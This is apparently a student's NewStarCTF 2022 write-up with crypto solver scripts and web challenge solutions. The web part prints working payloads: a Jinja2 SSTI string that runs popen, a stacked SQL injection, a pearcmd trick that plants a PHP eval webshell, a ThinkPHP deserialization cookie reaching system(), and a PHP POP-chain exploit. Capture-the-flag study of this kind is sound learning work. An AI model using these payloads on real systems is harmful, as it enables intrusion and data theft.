# newstar2022


## week1

### misc
mmsstv
### crypto
rsa 维纳攻击
## week2
### misc
#### 奇怪的波形
侧信道  

看两个波形差距

#### 奇怪的二维码
二维码（Aztec Code  

[在线生成条形码 (aspose.app)](https://products.aspose.app/barcode/zh-hans/generate)

### crypto
#### ezRabin
rabin加密时e为2，本题目e为4，一次解密得到的是m^2 mod n，再解密一次就能得到m  

[RSA攻击之Rabin密码体制_Gm1y的博客-CSDN博客_rabin密码](https://blog.csdn.net/jcbx_/article/details/101066670)

#### ezPRNG
task.py：
```python
from Crypto.Util.number import *
flag = b'xxxxxxxxxxxxxxxxxxxx'

class my_prng_lcg:
    def __init__(self, seed, multiplier, increment, modulus):
        self.state = seed
        self.multiplier = multiplier
        self.increment = increment
        self.modulus = modulus

    def random(self):
        self.state = (self.state * self.multiplier + self.increment) % self.modulus
        return self.state

PRNG = my_prng_lcg(bytes_to_long(flag), getRandomInteger(256), getRandomInteger(256), getRandomInteger(256))
gift = []
for i in range(6):
    gift.append(PRNG.random())

qwq = bytes_to_long(flag)
print(qwq.bit_length())
print(gift)
# [32579077549265101609729134002322479188058664203229584246639330306875565342934, 
# 30627296760863751873213598737521260410801961411772904859782399797798775242121, 
# 59045755507520598673072877669036271379314362490837080079400207813316110037822, 
# 29714794521560972198312794885289362350476307292503308718904661896314434077717, 
# 3378007627369454232183998646610752441039379051735310926898417029172995488622, 
# 35893579613746468714922176435597562302206699188445795487657524606666534642489]
```
[https://www.codercto.com/a/35743.html](https://www.codercto.com/a/35743.html)  

[Crypto学习笔记 – 天璇Merak (buptmerak.cn)](https://we.buptmerak.cn/archives/210)  

[PRNG伪随机数的破解方法_OnlyForBetter的博客-CSDN博客_prng](https://blog.csdn.net/hacker_zrq/article/details/120891641)  

exp.py：

```python
from Crypto.Util.number import *
from functools import reduce
import gmpy2

# states至少3
def crack_unkown_N0(states,moudulus):
    a=((states[2]-states[1])*gmpy2.invert(states[1]-states[0],moudulus))%moudulus
    b=(states[1]-(a*states[0]))%moudulus
    return (((states[0]-b))*gmpy2.invert(a,n)+n)%moudulus

def crack_unknown_increment(states, modulus, multiplier): 
    increment = (states[1] - states[0]*multiplier) % modulus 
    return modulus, multiplier, increment

def crack_unknown_multiplier(states, modulus):
    multiplier = (states[2] - states[1]) * inverse(states[1] - states[0], modulus) % modulus 
    return crack_unknown_increment(states, modulus, multiplier)

# states至少6
def crack_unknown_modulus(states): 
    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] 
    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] 
    modulus = abs(reduce(GCD, zeroes)) 
    return crack_unknown_multiplier(states, modulus)

data = [32579077549265101609729134002322479188058664203229584246639330306875565342934,30627296760863751873213598737521260410801961411772904859782399797798775242121,59045755507520598673072877669036271379314362490837080079400207813316110037822,29714794521560972198312794885289362350476307292503308718904661896314434077717,3378007627369454232183998646610752441039379051735310926898417029172995488622,35893579613746468714922176435597562302206699188445795487657524606666534642489]

n,a,b = crack_unknown_modulus(data)

flag = crack_unkown_N0(data,n)
print(long_to_bytes(flag).decode())
```
### web
#### IncludeOne
php伪随机数  

[php_mt_seed - PHP mt_rand() seed cracker (openwall.com)](https://www.openwall.com/php_mt_seed/)  

php伪协议（rot13  

payload

```
?file=php://filter/read=string.rot13/NewStar/resource=./flag.php
guess=1202031004
```
题目要求有NewStar/，在伪协议这个地方添加不会影响读取
#### UnserializeOne
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```
[PHP反序列化研究 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/377676274)  

（序列化保存对象成员值，自定义函数不会保存  

exp.php

```php
<?php
class Start{
    public $name;
    protected $func;

    public function __construct($name,$func)
    {
        $this->name = $name;
        $this->func = $func;
    }


}

class Sec{
    private $obj;
    private $var;

    public function __construct($obj, $var)
    {
        $this->obj = $obj;
        $this->var = $var;
    }

}

class Easy{
    public $cla;

    public function __construct($cla)
    {
        $this->cla = $cla;
    }

}

class eeee{
    public $obj;

    public function __construct($obj)
    {
        $this->obj = $obj;
    }

}

$Sec1 = new Sec(null,null);
$Start1 = new Start("mof",$Sec1);
$eeee = new eeee($Start1);
$Easy = new Easy(null);
$Sec2 = new Sec($Easy,$eeee);
$Start2 = new Start($Sec2,$Sec2);
echo urlencode(serialize($Start2));
?>
```
#### ezAPI
御剑扫到www.zip源码  

index.php

```php+HTML
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
    <title>Search Page</title>
    <link rel="stylesheet" type="text/css" href="css/style.css" tppabs="css/style.css" />
    <style>
        body {
            height: 100%;
            background: #16a085;
            overflow: hidden;
        }

        canvas {
            z-index: -1;
            position: absolute;
        }
    </style>
    <script src="js/jquery.js"></script>
    <script src="js/verificationNumbers.js" tppabs="js/verificationNumbers.js"></script>
    <script src="js/Particleground.js" tppabs="js/Particleground.js"></script>
    <script>
        $(document).ready(function() {
            $('body').particleground({
                dotColor: '#5cbdaa',
                lineColor: '#5cbdaa'
            });
        });ß
    </script>
</head>
<!--unremove DEBUG function, please delete it-->
<body>
    <dl class="admin_login">
        <dt>
            <font color="white"><strong>Search Page Beta</strong></font>
        </dt>
        <form action="index.php" method="post">
            <dd class="user_icon">
                <input type="text" name="id" placeholder="用户ID" class="login_txtbx" />
            </dd>
            <dd>
                <input type="submit" value="Search" class="submit_btn" />
            </dd>
        </form><br>
        <center>
            <font size="4px" color="white">
                <?php
                error_reporting(0);
                $id = $_POST['id'];
                function waf($str)
                {
                    if (!is_numeric($str) || preg_replace("/[0-9]/", "", $str) !== "") {
                        return False;
                    } else {
                        return True;
                    }
                }

                function send($data)
                {
                    $options = array(
                        'http' => array(
                            'method' => 'POST',
                            'header' => 'Content-type: application/json',
                            'content' => $data,
                            'timeout' => 10 * 60
                        )
                    );
                    $context = stream_context_create($options);
                    $result = file_get_contents("http://graphql:8080/v1/graphql", false, $context);
                    return $result;
                }

                if (isset($id)) {
                    if (waf($id)) {
                        isset($_POST['data']) ? $data = $_POST['data'] : $data = '{"query":"query{\nusers_user_by_pk(id:' . $id . ') {\nname\n}\n}\n", "variables":null}';
                        $res = json_decode(send($data));
                        if ($res->data->users_user_by_pk->name !== NULL) {
                            echo "ID: " . $id . "<br>Name: " . $res->data->users_user_by_pk->name;
                        } else {
                            echo "<b>Can't found it!</b><br><br>DEBUG: ";
                            var_dump($res->data);
                        }
                    } else {
                        die("<b>Hacker! Only Number!</b>");
                    }
                } else {
                    die("<b>No Data?</b>");
                }
                ?>
            </font>
        </center>
    </dl>
</body>

</html>
```
发现使用$data进行graphQL查询
```php
isset($_POST['data']) ? $data = $_POST['data'] : $data = '{"query":"query{\nusers_user_by_pk(id:' . $id . ') {\nname\n}\n}\n", "variables":null}';
```
参考：[当CTF遇上GraphQL的那些事 (hwlanxiaojun.github.io)](https://hwlanxiaojun.github.io/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/)  

大体解析过程，是遇到一个Query就取值，对返回值解析，递归遍历  

常见爆信息payload：

```php
query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```
```php
query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```
利用上述payload爆出信息，发现 ffffllllaaagggg_1n_h3r3_flag
```php
["name"]=>
string(28) "ffffllllaaagggg_1n_h3r3_flag"
["description"]=>
string(59) "columns and relationships of "ffffllllaaagggg_1n_h3r3.flag""
```
通过flag读取
```php
data={"query":"query {ffffllllaaagggg_1n_h3r3_flag{flag}}"}
```
## week3
### web
#### BabySSTI_One
flask ssti注入  

[Python安全 | Flask-jinja2 SSTI 利用手册 - Python社区 (python88.com)](http://www.python88.com/topic/115601)  

思路：找到os，执行命令读取  

绕过：|attr() 加 字符串拼接  

payload：

```bash
?name=%7B%7B()|attr("__cla"+"ss__")|attr("__bas"+"es__")|attr("__getitem__")(0)|attr("__subcl"+"asses__")()|attr("__getitem__")(117)|attr("__in"+"it__")|attr("__globals__")|attr("__getitem__")("popen")("ca"+"t%20/fl"+"ag_in_here")|attr("read")()%7D%7D
```
#### multiSQL
堆叠注入+update  

[BUUCTF-Web-随便注(三种解题思路) - 简书 (jianshu.com)](https://www.jianshu.com/p/36f0772f5ce8)  

绕过：预处理语句 + concat字符串拼接  

payload：

```bash
?username=1' or ''='';SET @sql=concat('up','date score SET listen=200');PREPARE jwt from @sql;EXECUTE jwt;#
```
#### IncludeTwo
percmd.php + rce  

[Sourceless Guessy Web (pearcmd+rce)](http://landasika.top/2022/06/11/sourceless-guessy-web/)  

payload:

```bash
?file=pearcmd&+config-create+/<?=@eval($_POST['cmd']);?>+./cmd.php
```
中国蚁剑连接
```bash
url?file=./cmd
cmd
```
#### Maybe You Have To think More
[https://www.freebuf.com/vuls/263977.html](https://www.freebuf.com/vuls/263977.html)
thinkphp5.1.41 rce漏洞 + cookie
[https://www.anquanke.com/post/id/241148](https://www.anquanke.com/post/id/241148)
linux proc获取环境变量信息发现flag  

payload：

```bash
Cookie: tp_user=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=
?name=cat%20/proc/self/environ
```
### crpto
#### keyExchange
keyExchange.py
```python
from secret import flag, gb, g, p, Diffie_Hellman_KEY_EXCHANGE
from Crypto.Util.number import *
from base64 import b64encode
from Crypto.Cipher import AES
from hashlib import md5
from Crypto.Util.Padding import pad

plaintext = pad(flag, 16)

a = getRandomNBitInteger(1024)
shared = Diffie_Hellman_KEY_EXCHANGE(a) 
# the original one, not the elliptic curve version!!!!
key = md5(str(shared).encode()).digest()

cipher = AES.new(key, AES.MODE_ECB)
ciphertext = cipher.encrypt(plaintext)

print(f'师傅给你送了一个flag')
print(f'加密的flag = {b64encode(ciphertext)}')
print(f'p = {p}')
print(f'your secret key {a}')
print(f'g = {g}')
print(f'师傅的公钥 = {gb}')
```
output.txt
```python
师傅给你送了一个flag
加密的flag = b'w8OCrexPPqnv2hR+xKeHhXIp0Blp1DYCV4LeZeeLpv5MzUL71raTOeOs4SQBySHH'
p = 133448764119399847876731592238604881175769007976799828874328988761588128500145459082023001027383524831194316266946485380737147372837136403065060245135035225976604193830121124575947440188318348815263642243784574567832213775382081426762862856428888257126982268557543952549848053225651398101391048467656128070913
your secret key 141940531741414073502483547551457269459744373002985569536254444581939073930343975447649087549033350166772929396986965301002444997704537487577508504709368627174241095027876996113941220579274986994026832534664179333669861059196192190040046004398523932288881838011696679341328520530265002776147308306715042734185
g = 3
师傅的公钥 = 89434791765835058026108803508194156525355359465406829253856379139334424137549915669535243140614128105195584073112084994777148895681804127886440617684648237403345873311011154293855911891719204975035914932661810961867593769891076834656437254428353814290948181922438812745384577094827728409350756648446941874382
```
DH秘钥交换方法

1. Alice，Bob事先约定参数：素数p，⽣成元g
2. Alice私钥skA，公钥pkA=gskA；Bob私钥skB，公钥pkB=gskB
3. 进⾏密钥交换时，计算share=pkAskB=pkBskA=g^(skA*skB)

题⽬中给出了⼀⽅的公钥与另⼀⽅的私钥，直接计算可以得到交换密钥
```python
import base64
from hashlib import md5
from Crypto.Cipher import AES

a = 141940531741414073502483547551457269459744373002985569536254444581939073930343975447649087549033350166772929396986965301002444997704537487577508504709368627174241095027876996113941220579274986994026832534664179333669861059196192190040046004398523932288881838011696679341328520530265002776147308306715042734185
p = 133448764119399847876731592238604881175769007976799828874328988761588128500145459082023001027383524831194316266946485380737147372837136403065060245135035225976604193830121124575947440188318348815263642243784574567832213775382081426762862856428888257126982268557543952549848053225651398101391048467656128070913
g = 3
gb = 89434791765835058026108803508194156525355359465406829253856379139334424137549915669535243140614128105195584073112084994777148895681804127886440617684648237403345873311011154293855911891719204975035914932661810961867593769891076834656437254428353814290948181922438812745384577094827728409350756648446941874382
flag = b'w8OCrexPPqnv2hR+xKeHhXIp0Blp1DYCV4LeZeeLpv5MzUL71raTOeOs4SQBySHH'
flag = base64.b64decode(flag)
K = pow(gb,a,p)
key = md5(str(K).encode()).digest()
cipher = AES.new(key,AES.MODE_ECB)
flag = cipher.decrypt(flag)
print(flag.decode())
```
#### Prof. Shamir's Secret
lab.py：
```python
from Crypto.Util.number import *
from secret import flag
a = getPrime(256)
b = getPrime(256)
c = getPrime(256)
d = bytes_to_long(flag)
n = getStrongPrime(2048)

def poly(x):
    return (a * x ** 3 + b * x ** 2 + c * x + d) % n

for _ in range(4):
    x = getRandomNBitInteger(256)
    print(f'({x}, {poly(x)})')

print(n)
```
output.txt：
```python
(107156592202708719207677242145785380370925248573491581679548864240229105117413, 130345771647598884054430192964980389494531690916321281560051538057910945565624075918097771618618910263287152864051564635195578796179646674192491555857366963976329072793625649841007238934532144994966695961491116944111900519450656607199501654544809304677384301432194356761274376314501143216649135187625964931902)
(90629424458637844580841178302065768114471702341586161908858665404968070428143, 78858394764644720845979385422903377630845158220853604360871859882044655577246282808874532941560824773914594412415345616068416548364923695233972936176087206729847544516343237888024173952758718279163069742944961359652574962129434781851767007643037433981750489254639449637677610354746497770492254725894119193662)
(100626477579781167218124067468465940736522526684796828200460725563611057086831, 107938673826832098883774065383352754899611421173786919174851524067358319831595518533880365335333592351382030254987030861475878447430100862628809476494215295084769705787398168068863060859122952000010558086859754975554734850230223040925027217057055876423229204027280075168615462165634569977166298865366648414270)
(93935717805931479760310332373603550626215862380271563609987050092246456803681, 87807687834883656794449107852803757931909462710953942209358337840912886376275257864214018767300085688088981183791568376874906785193974861264511995029891797395218085734556515485224508250678274640400740193260888803386269425525930551167801371074041851406813322268615707951973495879968706624649318162995708734670)
31332583438236375592937719796184754941510418106758544436807128579095975774977164550965999210436423180868482749439792419270701760326867558983833590368116755394302102816558834270767750410927007254951332459412016857259923960095221831744199277859298274645778838122123090174549834537459028702418645316659860963695912411044490603690484176741018002722235584411422885336520840416125528921196994346534698226763483608314982898155320734426983215291745003213365884087604024203316024824786079501166114638727651689476288442288919373885358425210859822108037791909364199015379638899887715692181883916583183449343868694265742569597579
```
拉格朗日插值   

exp.py

```python
from Crypto.Util.number import *
x = [107156592202708719207677242145785380370925248573491581679548864240229105117413,90629424458637844580841178302065768114471702341586161908858665404968070428143,100626477579781167218124067468465940736522526684796828200460725563611057086831,93935717805931479760310332373603550626215862380271563609987050092246456803681]
fx = [130345771647598884054430192964980389494531690916321281560051538057910945565624075918097771618618910263287152864051564635195578796179646674192491555857366963976329072793625649841007238934532144994966695961491116944111900519450656607199501654544809304677384301432194356761274376314501143216649135187625964931902,78858394764644720845979385422903377630845158220853604360871859882044655577246282808874532941560824773914594412415345616068416548364923695233972936176087206729847544516343237888024173952758718279163069742944961359652574962129434781851767007643037433981750489254639449637677610354746497770492254725894119193662,107938673826832098883774065383352754899611421173786919174851524067358319831595518533880365335333592351382030254987030861475878447430100862628809476494215295084769705787398168068863060859122952000010558086859754975554734850230223040925027217057055876423229204027280075168615462165634569977166298865366648414270,87807687834883656794449107852803757931909462710953942209358337840912886376275257864214018767300085688088981183791568376874906785193974861264511995029891797395218085734556515485224508250678274640400740193260888803386269425525930551167801371074041851406813322268615707951973495879968706624649318162995708734670]
p = 31332583438236375592937719796184754941510418106758544436807128579095975774977164550965999210436423180868482749439792419270701760326867558983833590368116755394302102816558834270767750410927007254951332459412016857259923960095221831744199277859298274645778838122123090174549834537459028702418645316659860963695912411044490603690484176741018002722235584411422885336520840416125528921196994346534698226763483608314982898155320734426983215291745003213365884087604024203316024824786079501166114638727651689476288442288919373885358425210859822108037791909364199015379638899887715692181883916583183449343868694265742569597579
u = [1,1,1,1]

u[0] = (-x[1]*x[2]*x[3]*fx[0])//((x[0]-x[1])*(x[0]-x[2])*(x[0]-x[3]))  
u[1] = (-x[0]*x[2]*x[3]*fx[1])//((x[1]-x[0])*(x[1]-x[2])*(x[1]-x[3]))
u[2] = (-x[1]*x[0]*x[3]*fx[2])//((x[2]-x[1])*(x[2]-x[0])*(x[2]-x[3]))
u[3] = (-x[1]*x[2]*x[0]*fx[3])//((x[3]-x[1])*(x[3]-x[2])*(x[3]-x[0]))
print(u)

s = pow(u[0]+u[1]+u[2]+u[3],1,p)
print(long_to_bytes(s).decode('utf-8','ignore'))

# 除法误差大
```
exp.sage
```python
Point =
[(107156592202708719207677242145785380370925248573491581679548864240229105117413,130345771647598884054430192964980389494531690916321281560051538057910945565624075918097771618618910263287152864051564635195578796179646674192491555857366963976329072793625649841007238934532144994966695961491116944111900519450656607199501654544809304677384301432194356761274376314501143216649135187625964931902),(90629424458637844580841178302065768114471702341586161908858665404968070428143,
78858394764644720845979385422903377630845158220853604360871859882044655577246282808874532941560824773914594412415345616068416548364923695233972936176087206729847544516343237888024173952758718279163069742944961359652574962129434781851767007643037433981750489254639449637677610354746497770492254725894119193662),(100626477579781167218124067468465940736522526684796828200460725563611057086831,107938673826832098883774065383352754899611421173786919174851524067358319831595518533880365335333592351382030254987030861475878447430100862628809476494215295084769705787398168068863060859122952000010558086859754975554734850230223040925027217057055876423229204027280075168615462165634569977166298865366648414270),(93935717805931479760310332373603550626215862380271563609987050092246456803681,
87807687834883656794449107852803757931909462710953942209358337840912886376275257864214018767300085688088981183791568376874906785193974861264511995029891797395218085734556515485224508250678274640400740193260888803386269425525930551167801371074041851406813322268615707951973495879968706624649318162995708734670)]
p =31332583438236375592937719796184754941510418106758544436807128579095975774977164550965999210436423180868482749439792419270701760326867558983833590368116755394302102816558834270767750410927007254951332459412016857259923960095221831744199277859298274645778838122123090174549834537459028702418645316659860963695912411044490603690484176741018002722235584411422885336520840416125528921196994346534698226763483608314982898155320734426983215291745003213365884087604024203316024824786079501166114638727651689476288442288919373885358425210859822108037791909364199015379638899887715692181883916583183449343868694265742569597579
R.<x> = PolynomialRing(GF(p))
f = R.lagrange_polynomial(Point)
flag = int(f(0))
print(bytes.fromhex(hex(flag)[2:]))
```
#### OTP
onetimepad：
```python
from pwn import xor
from string import ascii_lowercase
from secret import keylength
import random
key = []

for _ in range(keylength):
    key.append(random.choice(ascii_lowercase.encode()))

key = bytes(key)

plaintext = open('books.txt','rb').read()

ciphertext = xor(plaintext, key)
print(key)
open('encrypted_book', 'wb').write(ciphertext)
```
gift_from_sias27.py：
```python
# ------------------------------------------------------
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# ------------------------------------------------------
from itertools import product
from libnum import *
# ------------------------------------------------------
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# ------------------------------------------------------
def hamming_distance(a, b):
    if len(a) != len(b):
        return -1
    bit_1_a = 0
    bit_2_a = 0
    for i in range(len(a)):
        bit_1_a += bin(a[i][2:])
        bit_2_a += bin(b[i][2:])
    return abs(bit_1_a - bit_2_a)
# ------------------------------------------------------
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# 查完相关资料后再使用本文件
# ------------------------------------------------------
y = 0
def kasiski_test(ciphretext:bytes, length=3):
    global y
    # if y == 0:
    #     print('你查完资料了吗?')
    #     y = input('(Y/N) > ')
    #     if 'N' in y or 'n' in y:
    #         exit()
    dup_sturct = []
    for i in range(len(ciphretext) - 3):
        sub_struct = ciphretext[i:i+length]
        if ciphretext.count(sub_struct) >= 2:
            dup_sturct.append(sub_struct)
    possible_range = set()
    for d in dup_sturct:
        start = []
        i = 0
        while i+length < len(ciphretext):
            if d == ciphretext[i:i+length]:
                start.append(i)
            i += 1
        diff = []
        for i in range(len(start) - 1):
            diff.append(start[i+1] - start[i])
        possible_range.add(gcd(*diff))
    gcd_list = []
    for i in product(possible_range, repeat=2):
        gcd_list.append(gcd(i[0],i[1]))
    gcd_elem = set(gcd_list)
    pre_sort = []
    width = 0
    for i in gcd_elem:
        pre_sort.append((i, gcd_list.count(i) / len(gcd_list)))
        width = max(width, len(str(i)))
    pre_sort.sort(key = lambda t:t[1])
    for t in pre_sort[::-1]:
        print(f'key length: {str(t[0]).rjust(width, " ")} with probability {t[1]}')
    return pre_sort[-1][0]
```
多字节秘钥xor，利用gift_from_sias27.py中的kasiski_test算出秘钥长度为5，再将密文分组，每组的秘钥为1字节，可根据明文特征（可打印字符；字频；等等）爆破出秘钥  

[加密 - 第1部分。打破异或加密。|戒指0x00 (idafchev.github.io)](https://idafchev.github.io/crypto/2017/04/13/crypto_part1.html)  

exp.py：  

可打印字符（慢

```python
import gift_from_sias27
from pwn import xor
import string

f = open("encrypted_book","rb").read()
len = len(f.decode())

# m = gift_from_sias27.kasiski_test(f)
# print(m)
# keylength = 5
# b = [[] for _ in range(keylength)]
# for i in range(len):
#     b[i%keylength].append(f[i])

# key = [string.ascii_lowercase for _ in range(5)]

# for i in range(5):
#     for k in string.ascii_lowercase:
#         m = xor(b[i],k)
#         for char in m.decode():
#             if char not in string.printable:
#                 key[i] = key[i].replace(k,"")
#                 break
key = ['deinpqrsty', 'akpqrtuvw', 'ehiklmnorxy', 'bciprsuvw', 'bcdefgorsx']
i=0
for k1 in key[0]:
    for k2 in key[1]:
        for k3 in key[2]:
            for k4 in key[3]:
                for k5 in key[4]:
                    k = "".join(k1+k2+k3+k4+k5)
                    flag = xor(f,k.encode()).decode()
                    i+=1
                    print(i)
                    if "flag{" in flag:
                        print(flag)
                        print(k)
                        input()

'''Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis 
aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit 
qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? Sic secretum dabo tibi: flag{frequency_analysis_could_be_useful#A6DC1D643A29}. At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem rerum facilis est et expedita distinctio. Nam libero tempore, cum soluta nobis est eligendi optio cumque nihil impedit quo minus id quod maxime placeat facere possimus, omnis voluptas assumenda est, omnis dolor repellendus. Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat.

qtmvg'''
```
字频分析
```python
from pwn import *
with open('encrypted_book', 'rb') as f:
	enc = f.read()
print(enc)
key = []
keylen = 5
for ki in range(keylen):
	dic = dict()
	for i in range(0, len(enc) - ki, keylen):
		dic[enc[i+ki]] = dic.get(enc[i+ki], 0) + 1
	x = max(dic.keys(), key=lambda x:dic[x])
	key += [x ^ ord(' ')]
key = bytes(key)
print(key)
print(xor(key, enc))
```
#### AES?
task.py：
```python
from Crypto.Cipher import AES
from binascii import b2a_hex
from libnum import s2n
from random import *
from secret import flag

def add_to_16(text):
    if len(text.encode('utf-8')) % 16:
        add = 16 - (len(text.encode('utf-8')) % 16)
    else:
        add = 0
    text = text + ('\0' * add)
    return text.encode('utf-8')

def init():
    r1 = getrandbits(64)
    r2 = getrandbits(32)
    m = "{:X}".format(r1).encode('utf-8')
    salt = "{:X}".format(r2).encode('utf-8')
    m += salt
    return add_to_16(m.decode())
 
def encrypt(m, key, iv):
    mode = AES.MODE_CBC
    cryptos = AES.new(key, mode, iv)
    cipher_text = cryptos.encrypt(m)
    return cipher_text

def chall(key, iv):
    old_m = init()
    c = encrypt(old_m, key, iv)
    return b2a_hex(c)

if __name__=="__main__":
    f = open("msg.txt", 'w+')
    old_key = b'73E5602B54FE63A5'
    old_iv = b'B435AE462FBAA662'
    for i in range(208):
        old_c = chall(old_key, old_iv)
        f.write("{}\n".format(old_c.decode()))

    salt = "{:X}".format(getrandbits(32)).encode('utf-8')
    m = flag.encode() + salt
    key = "{:X}".format(getrandbits(64)).encode('utf-8')
    iv = "{:X}".format(getrandbits(64)).encode('utf-8')
    c = encrypt(add_to_16(m.decode()), key, iv)
    print("c = %r"%(b2a_hex(c)))

# c = b'c82dc20b7512d03f1a0982eb8a6e855db20f6fe3ff8d202a6fb74c6522fa6e623c6abe6725cafe78f9624ad59f3e90af6f985f38f75ec4d62ff7e02bd7c2f051'
```
msg.txt：
```bash
73b9dad54a5fad919e9fc68e60fe25f8d98d5ac2d564d1f2885a6b744da3eb95
5a63a00cd3bdfc8eb5fbf3c6113bd1c50112fd52b775a2791c07b32b8defb823
48536d1739a3cf9434664cfd5d78083e97cee2cc79145c5d7097c4ed92cc9878
1fd06c0604a698665d53ead825acef03e301b35b826bcbcb83430cd4f81134b7
7fd0d848ba8f4c2599f25a6a6cc57fd2f3ca792a6af078264d8a9d9b5a747ed9
2a66f0f894e216ee6aae4dd186536144b7a60c12a916074918d7bd123bca9333
ddfb6b0a744e65e5003c4c6aed23e1c0213797a4cdfc9a4f62e07fca48d8b99e
923e3e4ce4ebd1ef1c7e2a86cd0fcd6262c88629c5a65a8c03bce2a2c55492ee
6c4d3552c0a3008ed23eb0c46432f2319a31977563fcf3d601b8386fa7a801f2
b8a898264d71ef88c7462696a37fd169739907b28a4c75bba92ec2faa5c78217
